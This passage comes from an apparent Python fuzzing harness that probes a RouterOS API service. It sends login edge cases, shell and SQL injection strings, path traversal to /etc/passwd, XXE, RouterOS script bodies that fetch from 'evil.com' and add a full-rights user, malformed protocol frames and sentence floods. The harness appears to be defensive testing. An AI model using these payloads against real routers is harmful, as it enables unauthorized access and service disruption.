            resp = recv_sentence(s, timeout=3)
            ok = resp and resp[0] == '!done'
            ev.add_test(cat, f"auth_extra_{name}", desc,
                        "accepted" if ok else f"rejected: {words_summary(resp)}",
                        details={"extra_attrs": extra_attrs})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"auth_extra_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 2.9  Multiple concurrent login attempts ──────────────────────────────
    results_concurrent = []

    def concurrent_login(idx):
        try:
            s = raw_connect(8728, timeout=5)
            ok, resp = api_login(s, ADMIN_USER, ADMIN_PASS)
            results_concurrent.append({"idx": idx, "success": ok})
            safe_close(s)
        except Exception as e:
            results_concurrent.append({"idx": idx, "error": str(e)})

    threads = []
    for i in range(10):
        t = threading.Thread(target=concurrent_login, args=(i,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=10)

    successes = sum(1 for r in results_concurrent if r.get("success"))
    ev.add_test(cat, "concurrent_login_10",
                "10 concurrent login attempts",
                f"{successes}/10 succeeded",
                details={"results": results_concurrent})

    # ── 2.10  Login after previous failed attempt on same socket ─────────────
    try:
        s = raw_connect(8728, timeout=5)
        # First: wrong password
        ok1, resp1 = api_login(s, ADMIN_USER, "WrongPass")
        # Second: correct password on same socket
        ok2, resp2 = api_login(s, ADMIN_USER, ADMIN_PASS)
        ev.add_test(cat, "retry_login_same_socket",
                    "Login retry after failure on same socket",
                    f"first={'ok' if ok1 else 'fail'}, second={'ok' if ok2 else 'fail'}",
                    details={"first_response": words_summary(resp1),
                             "second_response": words_summary(resp2)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "retry_login_same_socket",
                    "Login retry on same socket", f"error: {e}")

    # ── 2.11  Login with swapped name/password attribute names ───────────────
    try:
        s = raw_connect(8728, timeout=3)
        # Send password in name field and vice versa
        send_sentence(s, ['/login', f'=name={ADMIN_PASS}',
                          f'=password={ADMIN_USER}'])
        resp = recv_sentence(s, timeout=3)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "auth_swapped_attrs",
                    "Login with name=password_value, password=username_value",
                    "login_success" if ok else f"rejected: {words_summary(resp)}",
                    anomaly=ok)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_swapped_attrs",
                    "Swapped attribute login", f"error: {e}")

    # ── 2.12  Login with duplicate attributes ────────────────────────────────
    try:
        s = raw_connect(8728, timeout=3)
        send_sentence(s, ['/login', '=name=admin', '=name=testread',
                          f'=password={ADMIN_PASS}'])
        resp = recv_sentence(s, timeout=3)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "auth_duplicate_name_attr",
                    "Login with two =name= attributes (admin, testread)",
                    "login_success" if ok else f"rejected: {words_summary(resp)}",
                    details={"response": words_summary(resp)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_duplicate_name_attr",
                    "Duplicate name attribute login", f"error: {e}")

    # ── 2.13  Login with password before name ────────────────────────────────
    try:
        s = raw_connect(8728, timeout=3)
        send_sentence(s, ['/login', f'=password={ADMIN_PASS}',
                          f'=name={ADMIN_USER}'])
        resp = recv_sentence(s, timeout=3)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "auth_password_before_name",
                    "Login with =password= before =name= (reversed order)",
                    "login_success" if ok else f"rejected: {words_summary(resp)}")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_password_before_name",
                    "Reversed attribute order", f"error: {e}")

    # ── 2.14  Login with uppercase command ───────────────────────────────────
    try:
        s = raw_connect(8728, timeout=3)
        send_sentence(s, ['/LOGIN', f'=name={ADMIN_USER}',
                          f'=password={ADMIN_PASS}'])
        resp = recv_sentence(s, timeout=3)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "auth_uppercase_login",
                    "Login with /LOGIN (uppercase command)",
                    "login_success" if ok else f"rejected: {words_summary(resp)}")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_uppercase_login",
                    "Uppercase /LOGIN", f"error: {e}")

    # ── 2.15  Login attempt on SSL port with valid credentials ───────────────
    try:
        s = raw_connect_ssl(8729, timeout=5)
        ok, resp = api_login(s, ADMIN_USER, ADMIN_PASS)
        # Now do a command to verify full access
        if ok:
            replies = api_command(s, "/system/identity/print", timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "auth_ssl_then_command",
                        "Login on SSL port 8729, then execute command",
                        f"login_ok, cmd: {reply_text[:80]}")
        else:
            ev.add_test(cat, "auth_ssl_then_command",
                        "SSL login + command",
                        f"login_failed: {words_summary(resp)}", anomaly=True)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_ssl_then_command",
                    "SSL auth + command", f"error: {e}")

    health_gate(ev)

    # ── 2.16  Response to wrong password: check error message content ────────
    try:
        s = raw_connect(8728, timeout=3)
        ok, resp = api_login(s, ADMIN_USER, "TotallyWrong")
        error_msg = ""
        if resp:
            for w in resp:
                if w.startswith("=message="):
                    error_msg = w[9:]
        # Check if error reveals whether user exists
        ev.add_test(cat, "auth_error_message_content",
                    "Error message content on wrong password (info disclosure check)",
                    f"message: {error_msg[:100]}",
                    details={"error_message": error_msg,
                             "reveals_user_exists": "invalid" not in error_msg.lower()})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_error_message_content",
                    "Error message check", f"error: {e}")

    # ── 2.17  Response to nonexistent user: compare error message ────────────
    try:
        s = raw_connect(8728, timeout=3)
        ok, resp = api_login(s, "definitely_not_a_user_xyz", "TotallyWrong")
        error_msg = ""
        if resp:
            for w in resp:
                if w.startswith("=message="):
                    error_msg = w[9:]
        ev.add_test(cat, "auth_error_message_nonexistent",
                    "Error message for nonexistent user (compare with valid user)",
                    f"message: {error_msg[:100]}",
                    details={"error_message": error_msg})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "auth_error_message_nonexistent",
                    "Nonexistent user error message", f"error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  Category 3: Command Injection (~40 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_command_injection(ev):
    log("=" * 60)
    log("Category 3: Command Injection")
    log("=" * 60)

    cat = "command_injection"

    # Helper: authenticated socket
    def auth_socket():
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if not ok:
            safe_close(s)
            return None
        return s

    # ── 3.1  Shell metacharacters in command words ───────────────────────────
    metachar_commands = [
        ("semicolon_id", "/system/resource/print;id",
         "Semicolon injection in command path"),
        ("pipe_id", "/system/resource/print|id",
         "Pipe injection in command path"),
        ("ampersand_id", "/system/resource/print&id",
         "Ampersand injection in command path"),
        ("backtick_id", "/system/resource/print`id`",
         "Backtick injection in command path"),
        ("dollar_paren_id", "/system/resource/print$(id)",
         "Dollar-paren injection in command path"),
        ("newline_id", "/system/resource/print\nid",
         "Newline injection in command path"),
        ("carriage_return", "/system/resource/print\rid",
         "Carriage return injection"),
        ("double_ampersand", "/system/resource/print&&id",
         "Double ampersand injection"),
        ("redirect_out", "/system/resource/print>/tmp/pwned",
         "Redirect injection in command"),
        ("redirect_in", "/system/resource/print</etc/passwd",
         "Input redirect injection"),
    ]

    for name, cmd, desc in metachar_commands:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_cmd_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, cmd, timeout=3)
            reply_text = sentence_summary(replies)
            # Check for injection indicators
            injected = False
            for r in replies:
                r_str = " ".join(r) if isinstance(r, list) else str(r)
                if any(x in r_str.lower() for x in
                       ["uid=", "root:", "/bin/", "pwned", "passwd"]):
                    injected = True
            ev.add_test(cat, f"inject_cmd_{name}", desc,
                        "INJECTED" if injected else f"safe: {reply_text[:100]}",
                        details={"command": repr(cmd), "response": reply_text},
                        anomaly=injected)
            if injected:
                ev.add_finding("CRITICAL",
                               f"Command injection via {name}",
                               f"Shell metachar injection succeeded: {repr(cmd)}",
                               cwe="CWE-78")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_cmd_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 3.2  Null bytes in command path ──────────────────────────────────────
    null_commands = [
        ("null_mid_path", "/system\x00/resource/print",
         "Null byte in middle of command path"),
        ("null_after_cmd", "/system/resource/print\x00extra",
         "Null byte appended to command"),
        ("null_before_cmd", "\x00/system/resource/print",
         "Null byte before command"),
    ]
    for name, cmd, desc in null_commands:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_null_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, cmd, timeout=3)
            reply_text = sentence_summary(replies)
            # Check if it executed as if null was not there
            executed = any(r[0] == '!re' for r in replies if r)
            ev.add_test(cat, f"inject_null_{name}", desc,
                        f"executed={'yes' if executed else 'no'}: {reply_text[:100]}",
                        details={"command_repr": repr(cmd)})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_null_{name}", desc, f"error: {e}")

    # ── 3.3  Path traversal in command words ─────────────────────────────────
    traversal_commands = [
        ("etc_passwd", "/../../etc/passwd",
         "Path traversal to /etc/passwd"),
        ("system_traversal", "/system/../../../etc/passwd",
         "Path traversal via /system/../.."),
        ("dot_only", "/system/./resource/print",
         "Single dot in path"),
        ("double_dot", "/system/../system/resource/print",
         "Double dot traversal (same level)"),
        ("encoded_dot", "/system/%2e%2e/resource/print",
         "URL-encoded double dot"),
        ("windows_traversal", "/system\\..\\..\\etc\\passwd",
         "Backslash traversal (Windows-style)"),
    ]
    for name, cmd, desc in traversal_commands:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_traversal_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, cmd, timeout=3)
            reply_text = sentence_summary(replies)
            leaked = False
            for r in replies:
                r_str = " ".join(r) if isinstance(r, list) else str(r)
                if any(x in r_str.lower() for x in
                       ["root:", "/bin/", "nobody", "daemon"]):
                    leaked = True
            ev.add_test(cat, f"inject_traversal_{name}", desc,
                        "FILE_LEAKED" if leaked else f"safe: {reply_text[:100]}",
                        details={"command": repr(cmd)},
                        anomaly=leaked)
            if leaked:
                ev.add_finding("HIGH",
                               f"Path traversal via API command: {name}",
                               f"Traversal in command path leaked file contents: {repr(cmd)}",
                               cwe="CWE-22")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_traversal_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 3.4  Injection in attribute values ───────────────────────────────────
    attr_injections = [
        ("semicolon", "comment", "test;id",
         "Semicolon injection in attribute value"),
        ("backtick", "comment", "test`id`",
         "Backtick injection in attribute value"),
        ("dollar_paren", "comment", "test$(id)",
         "Dollar-paren injection in attribute value"),
        ("pipe", "comment", "test|id",
         "Pipe injection in attribute value"),
        ("newline", "comment", "test\nid",
         "Newline injection in attribute value"),
        ("format_string", "comment", "%s%s%s%s%n%n",
         "Format string in attribute value"),
        ("sql_single_quote", "comment", "test'; DROP TABLE users;--",
         "SQL injection in attribute value"),
        ("xml_entity", "comment", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
         "XXE in attribute value"),
        ("long_value", "comment", "A" * 65536,
         "64KB attribute value"),
    ]
    for name, attr_name, attr_val, desc in attr_injections:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_attr_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            # Use /system/identity/set as it accepts =comment= on ROS7+,
            # fall back to /system/note/set if available
            replies = api_command(s, "/system/note/set",
                                  attrs={"note": attr_val}, timeout=3)
            reply_text = sentence_summary(replies)
            injected = False
            for r in replies:
                r_str = " ".join(r) if isinstance(r, list) else str(r)
                if any(x in r_str.lower() for x in
                       ["uid=", "root:", "/bin/", "dropped"]):
                    injected = True
            ev.add_test(cat, f"inject_attr_{name}", desc,
                        "INJECTED" if injected else f"safe: {reply_text[:100]}",
                        details={"attr": f"{attr_name}={repr(attr_val[:200])}"},
                        anomaly=injected)
            if injected:
                ev.add_finding("CRITICAL",
                               f"Command injection via attribute value: {name}",
                               f"Injection via attribute {attr_name}={repr(attr_val[:100])}",
                               cwe="CWE-78")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_attr_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 3.5  Injection in query words ────────────────────────────────────────
    query_injections = [
        ("dollar_paren", "?name=test$(id)", "Dollar-paren in query"),
        ("backtick", "?name=test`id`", "Backtick in query"),
        ("semicolon", "?name=test;id", "Semicolon in query"),
        ("pipe", "?name=test|id", "Pipe in query"),
        ("format_string", "?name=%s%s%n%n", "Format string in query"),
    ]
    for name, query, desc in query_injections:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_query_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            words = ["/user/print", query]
            send_sentence(s, words)
            replies = recv_all_sentences(s, timeout=3)
            reply_text = sentence_summary(replies)
            injected = False
            for r in replies:
                r_str = " ".join(r) if isinstance(r, list) else str(r)
                if "uid=" in r_str.lower() or "/bin/" in r_str.lower():
                    injected = True
            ev.add_test(cat, f"inject_query_{name}", desc,
                        "INJECTED" if injected else f"safe: {reply_text[:100]}",
                        anomaly=injected)
            if injected:
                ev.add_finding("CRITICAL",
                               f"Injection via query word: {name}",
                               f"Injection in query: {repr(query)}",
                               cwe="CWE-78")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_query_{name}", desc, f"error: {e}")

    # ── 3.6  Unicode normalization attacks ───────────────────────────────────
    unicode_commands = [
        ("fullwidth_slash", "/\uff53ystem/resource/print",
         "Fullwidth 's' in command (normalization)"),
        ("homoglyph_system", "/\u0455y\u0455tem/resource/print",
         "Cyrillic homoglyphs in 'system'"),
        ("overlong_utf8_raw", "/system/resource/print",
         "Normal command for comparison"),
    ]
    for name, cmd, desc in unicode_commands:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_unicode_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, cmd, timeout=3)
            reply_text = sentence_summary(replies)
            executed = any(r[0] == '!re' for r in replies if r)
            ev.add_test(cat, f"inject_unicode_{name}", desc,
                        f"executed={'yes' if executed else 'no'}: {reply_text[:100]}",
                        details={"command_repr": repr(cmd)})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_unicode_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 3.7  Injection via IP address fields ─────────────────────────────────
    ip_injections = [
        ("ip_backtick", "[REDACTED-IP]`id`", "Backtick in IP address field"),
        ("ip_semicolon", "[REDACTED-IP];id", "Semicolon in IP address"),
        ("ip_pipe", "[REDACTED-IP]|id", "Pipe in IP address"),
        ("ip_dollar", "[REDACTED-IP]$(id)", "Dollar-paren in IP address"),
        ("ip_overflow", "999.999.999.999/99", "Invalid IP overflow"),
        ("ip_negative", "-1.-1.-1.-1/-1", "Negative octets in IP"),
    ]
    for name, ip_val, desc in ip_injections:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_ip_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, "/ip/address/add",
                                  attrs={"address": ip_val, "interface": "ether1"},
                                  timeout=3)
            reply_text = sentence_summary(replies)
            injected = False
            for r in replies:
                r_str = " ".join(r) if isinstance(r, list) else str(r)
                if any(x in r_str.lower() for x in ["uid=", "root:", "/bin/"]):
                    injected = True
            ev.add_test(cat, f"inject_ip_{name}", desc,
                        "INJECTED" if injected else f"safe: {reply_text[:100]}",
                        details={"value": repr(ip_val)},
                        anomaly=injected)
            if injected:
                ev.add_finding("CRITICAL",
                               f"Injection via IP address: {name}",
                               f"IP address field injection: {repr(ip_val)}",
                               cwe="CWE-78")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_ip_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 3.8  RouterOS script injection via /system/script/add ────────────────
    script_injections = [
        ("rsc_fetch", ':foreach i in=("a") do={/tool fetch url="http://evil.com"}',
         "RouterOS script with fetch command"),
        ("rsc_export", ':export file=config',
         "RouterOS export command in script body"),
        ("rsc_system_cmd", '/system reboot',
         "System reboot in script body"),
        ("rsc_semicolon_chain", ':log info test; /user add name=evil password=evil group=full',
         "Chained commands via semicolon in script"),
    ]
    for name, script_body, desc in script_injections:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_script_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            # Add script but do NOT run it
            replies = api_command(s, "/system/script/add",
                                  attrs={"name": f"test_{name}",
                                         "source": script_body},
                                  timeout=3)
            reply_text = sentence_summary(replies)
            created = any(r[0] == '!done' for r in replies if r) and \
                      not any(r[0] == '!trap' for r in replies if r)
            ev.add_test(cat, f"inject_script_{name}", desc,
                        f"script_created={created}: {reply_text[:100]}",
                        details={"script_body": script_body[:200]})

            # Cleanup: remove the script if created
            if created:
                try:
                    find_replies = api_command(s, "/system/script/print",
                                               queries=[f"?name=test_{name}"],
                                               timeout=3)
                    for r in find_replies:
                        if r[0] == '!re':
                            for w in r[1:]:
                                if w.startswith("=.id="):
                                    sid = w.split("=", 2)[2]
                                    api_command(s, "/system/script/remove",
                                                attrs={".id": sid}, timeout=3)
                except:
                    pass
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_script_{name}", desc, f"error: {e}")

    # ── 3.9  CRLF injection in attribute values ──────────────────────────────
    crlf_tests = [
        ("crlf_name", "test\r\ninjected", "CRLF in name attribute"),
        ("cr_only", "test\rinjected", "CR-only injection"),
        ("lf_only", "test\ninjected", "LF-only injection"),
        ("double_crlf", "test\r\n\r\ninjected", "Double CRLF injection"),
    ]
    for name, value, desc in crlf_tests:
        try:
            s = auth_socket()
            if not s:
                ev.add_test(cat, f"inject_crlf_{name}", desc,
                            "auth_failed", anomaly=True)
                continue
            replies = api_command(s, "/system/note/set",
                                  attrs={"note": value}, timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, f"inject_crlf_{name}", desc,
                        f"response: {reply_text[:100]}",
                        details={"value_repr": repr(value)})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"inject_crlf_{name}", desc, f"error: {e}")

    # Clean up note if we set it
    try:
        s = auth_socket()
        if s:
            api_command(s, "/system/note/set", attrs={"note": ""}, timeout=3)
            safe_close(s)
    except:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  Category 4: Protocol-Level Attacks (~50 tests) — HIGH PRIORITY
# ══════════════════════════════════════════════════════════════════════════════

def test_protocol_level_attacks(ev):
    log("=" * 60)
    log("Category 4: Protocol-Level Attacks (HIGH PRIORITY)")
    log("=" * 60)

    cat = "protocol_level"

    # ── 4.1  Malformed word lengths: length > actual data ────────────────────
    mismatch_tests = [
        ("len100_data5", b'\x64' + b'AAAAA',
         "Length says 100 (0x64) but only 5 bytes follow"),
        ("len255_data1", b'\x7f' + b'A',
         "Length says 127 but only 1 byte follows"),
        ("len1000_data5", b'\x83\xe8' + b'AAAAA',
         "2-byte length (1000) but only 5 bytes follow"),
    ]

    for name, raw_data, desc in mismatch_tests:
        try:
            s = raw_connect(8728, timeout=5)
            s.sendall(raw_data)
            time.sleep(1)
            # See if connection is still alive
            try:
                s.sendall(b'\x00')  # empty sentence terminator
                resp = s.recv(4096)
                ev.add_test(cat, f"malformed_len_{name}", desc,
                            f"connection_alive, got {len(resp)} bytes",
                            details={"raw_response": resp[:100].hex()})
            except:
                ev.add_test(cat, f"malformed_len_{name}", desc,
                            "connection_closed_or_timeout")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"malformed_len_{name}", desc, f"error: {e}")

    # ── 4.2  Length = 0 but bytes follow ─────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        # Send zero-length word (sentence terminator) then some data
        s.sendall(b'\x00' + b'ABCDEFGH')
        time.sleep(0.5)
        try:
            resp = s.recv(4096)
            ev.add_test(cat, "malformed_len_zero_with_data",
                        "Length 0 (sentence terminator) followed by raw data",
                        f"got {len(resp)} bytes: {resp[:50].hex()}",
                        details={"response_hex": resp[:100].hex()})
        except:
            ev.add_test(cat, "malformed_len_zero_with_data",
                        "Zero length followed by data",
                        "connection_closed_or_timeout")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "malformed_len_zero_with_data",
                    "Zero length with data", f"error: {e}")

    health_gate(ev)

    # ── 4.3  Boundary values at each encoding tier ───────────────────────────
    boundary_tests = [
        # (name, length_value, description)
        ("tier1_max_127", 0x7F,
         "Max 1-byte length (127)"),
        ("tier2_min_128", 0x80,
         "Min 2-byte length (128) — 1-to-2 boundary"),
        ("tier2_max_16383", 0x3FFF,
         "Max 2-byte length (16383)"),
        ("tier3_min_16384", 0x4000,
         "Min 3-byte length (16384) — 2-to-3 boundary"),
        ("tier3_max_2097151", 0x1FFFFF,
         "Max 3-byte length (2097151)"),
        ("tier4_min_2097152", 0x200000,
         "Min 4-byte length (2097152) — 3-to-4 boundary"),
    ]

    for name, length_val, desc in boundary_tests:
        try:
            s = raw_connect(8728, timeout=5)
            # Encode the length, then send that many bytes of 'A'
            # For very large values, we cap the actual sent data at 1MB
            encoded_len = encode_length(length_val)
            actual_send = min(length_val, 1024)  # Cap at 1KB for safety
            payload = encoded_len + b'A' * actual_send
            s.sendall(payload)
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, f"boundary_{name}", desc,
                            f"sent {actual_send} of {length_val} bytes, "
                            f"got {len(resp)} bytes back",
                            details={"length_value": length_val,
                                     "sent_bytes": actual_send,
                                     "response_hex": resp[:50].hex()})
            except socket.timeout:
                ev.add_test(cat, f"boundary_{name}", desc,
                            f"timeout (sent {actual_send} of {length_val} bytes)")
            except ConnectionError as e:
                ev.add_test(cat, f"boundary_{name}", desc,
                            f"connection_error: {e}")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"boundary_{name}", desc, f"error: {e}")

    # Test at higher tier boundaries with just the length header (no data)
    high_boundary_tests = [
        ("tier4_max_268435455", 0x0FFFFFFF, "Max 4-byte length (268435455)"),
        ("tier5_min_268435456", 0x10000000, "Min 5-byte length (268435456)"),
        ("tier5_max_ffffffff", 0xFFFFFFFF, "Max 5-byte length (4294967295)"),
    ]
    for name, length_val, desc in high_boundary_tests:
        try:
            s = raw_connect(8728, timeout=5)
            encoded_len = encode_length(length_val)
            # Just send the length header, no data — see how server reacts
            s.sendall(encoded_len)
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, f"boundary_{name}", desc,
                            f"length header sent, got {len(resp)} bytes",
                            details={"length_value": hex(length_val),
                                     "header_hex": encoded_len.hex(),
                                     "response_hex": resp[:50].hex()})
            except socket.timeout:
                ev.add_test(cat, f"boundary_{name}", desc,
                            "timeout (server waiting for data)")
            except ConnectionError as e:
                ev.add_test(cat, f"boundary_{name}", desc,
                            f"connection_dropped: {e}")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"boundary_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 4.4  Zero-length sentences ───────────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        # A sentence that is just the terminator (0x00)
        for _ in range(10):
            s.sendall(b'\x00')
        time.sleep(1)
        # Try to login afterwards
        ok, resp = api_login(s, ADMIN_USER, ADMIN_PASS)
        ev.add_test(cat, "zero_length_sentences_then_login",
                    "10 empty sentences (just 0x00) then attempt login",
                    f"login={'success' if ok else 'failed'}: {words_summary(resp)}",
                    details={"login_after_empty": ok})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "zero_length_sentences_then_login",
                    "Empty sentences then login", f"error: {e}")

    # ── 4.5  Oversized sentence: 1MB word ────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=10)
        big_word = "A" * (1024 * 1024)  # 1MB
        data = encode_sentence([big_word])
        s.sendall(data)
        time.sleep(2)
        try:
            resp = s.recv(4096)
            ev.add_test(cat, "oversized_1mb_word",
                        "Single sentence with 1MB word",
                        f"got {len(resp)} bytes back",
                        details={"response_hex": resp[:50].hex()})
        except socket.timeout:
            ev.add_test(cat, "oversized_1mb_word",
                        "1MB word in sentence",
                        "timeout (server processing/waiting)")
        except ConnectionError:
            ev.add_test(cat, "oversized_1mb_word",
                        "1MB word in sentence",
                        "connection_dropped")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "oversized_1mb_word",
                    "1MB word", f"error: {e}")

    health_gate(ev)

    # ── 4.6  Reserved/unused control bytes (0xF1-0xFF as length prefix) ──────
    for byte_val in [0xF1, 0xF5, 0xF8, 0xFB, 0xFE, 0xFF]:
        name = f"reserved_byte_0x{byte_val:02x}"
        try:
            s = raw_connect(8728, timeout=5)
            # Send reserved byte as length prefix + some data
            s.sendall(bytes([byte_val]) + b'\x00\x00\x00\x05AAAAA\x00')
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, name,
                            f"Reserved length prefix 0x{byte_val:02X} + data",
                            f"got {len(resp)} bytes: {resp[:50].hex()}",
                            details={"byte": hex(byte_val)})
            except socket.timeout:
                ev.add_test(cat, name,
                            f"Reserved length prefix 0x{byte_val:02X}",
                            "timeout")
            except ConnectionError:
                ev.add_test(cat, name,
                            f"Reserved length prefix 0x{byte_val:02X}",
                            "connection_dropped")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, name,
                        f"Reserved prefix 0x{byte_val:02X}", f"error: {e}")

    health_gate(ev)

    # ── 4.7  Raw binary garbage before authentication ────────────────────────
    garbage_payloads = [
        ("random_256", os.urandom(256), "256 bytes of random data"),
        ("all_zeros_256", b'\x00' * 256, "256 null bytes"),
        ("all_ff_256", b'\xFF' * 256, "256 bytes of 0xFF"),
        ("http_get", b'GET / HTTP/1.1\r\nHost: test\r\n\r\n',
         "HTTP GET request on API port"),
        ("ssh_banner", b'SSH-2.0-OpenSSH_9.0\r\n',
         "SSH banner on API port"),
        ("tls_client_hello", b'\x16\x03\x01\x00\x05\x01\x00\x00\x01\x00',
         "TLS ClientHello on plaintext API port"),
    ]
    for name, payload, desc in garbage_payloads:
        try:
            s = raw_connect(8728, timeout=5)
            s.sendall(payload)
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, f"garbage_{name}", desc,
                            f"got {len(resp)} bytes: {resp[:50].hex()}",
                            details={"response_hex": resp[:100].hex()})
            except socket.timeout:
                ev.add_test(cat, f"garbage_{name}", desc, "timeout")
            except ConnectionError:
                ev.add_test(cat, f"garbage_{name}", desc, "connection_dropped")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"garbage_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 4.8  Half-close connection (shutdown write, keep reading) ────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Send a command
            send_sentence(s, ["/system/identity/print"])
            # Shutdown write side
            s.shutdown(socket.SHUT_WR)
            # Try to read
            try:
                resp = s.recv(4096)
                ev.add_test(cat, "half_close_shutdown_write",
                            "Login, send command, shutdown(SHUT_WR), read response",
                            f"got {len(resp)} bytes after half-close",
                            details={"response_hex": resp[:50].hex()})
            except:
                ev.add_test(cat, "half_close_shutdown_write",
                            "Half-close connection test",
                            "no data after half-close")
        else:
            ev.add_test(cat, "half_close_shutdown_write",
                        "Half-close test", "auth_failed")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "half_close_shutdown_write",
                    "Half-close test", f"error: {e}")

    # ── 4.9  Interleaved partial sentences ───────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        # Send first half of a login word
        login_bytes = encode_word("/login")
        half = len(login_bytes) // 2
        s.sendall(login_bytes[:half])
        time.sleep(0.5)
        # Now send a completely different sentence
        s.sendall(encode_sentence(["/quit"]))
        time.sleep(0.5)
        # Now send the rest of the first word
        s.sendall(login_bytes[half:])
        time.sleep(1)
        try:
            resp = s.recv(4096)
            ev.add_test(cat, "interleaved_partial_sentences",
                        "Interleave partial words from different sentences",
                        f"got {len(resp)} bytes",
                        details={"response_hex": resp[:100].hex()})
        except:
            ev.add_test(cat, "interleaved_partial_sentences",
                        "Interleaved partial sentences",
                        "timeout_or_closed")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "interleaved_partial_sentences",
                    "Interleaved sentences", f"error: {e}")

    # ── 4.10  Rapid sentence flood ───────────────────────────────────────────
    try:
        s = raw_connect(8728, timeout=10)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            flood_data = encode_sentence(["/system/identity/print"]) * 500
            start = time.time()
            s.sendall(flood_data)
            elapsed = time.time() - start
            time.sleep(2)
            try:
                resp = s.recv(65536)
                ev.add_test(cat, "rapid_sentence_flood_500",
                            "Send 500 /system/identity/print sentences rapidly",
                            f"sent in {elapsed:.2f}s, got {len(resp)} bytes back",
                            details={"sentences": 500, "send_time": elapsed})
            except:
                ev.add_test(cat, "rapid_sentence_flood_500",
                            "500 sentence flood",
                            "timeout after flood")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "rapid_sentence_flood_500",
                    "Sentence flood", f"error: {e}")

    health_gate(ev)

    # ── 4.11  Many words in single sentence ──────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Sentence with 1000 words
            words = ["/system/resource/print"] + [f"=attr{i}=val{i}" for i in range(999)]
            data = encode_sentence(words)
            s.sendall(data)
            time.sleep(2)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, "many_words_1000_sentence",
                            "Single sentence with 1000 attribute words",
                            f"got {len(resp)} bytes",
                            details={"word_count": 1000,
                                     "sentence_size": len(data),
                                     "response_hex": resp[:50].hex()})
            except:
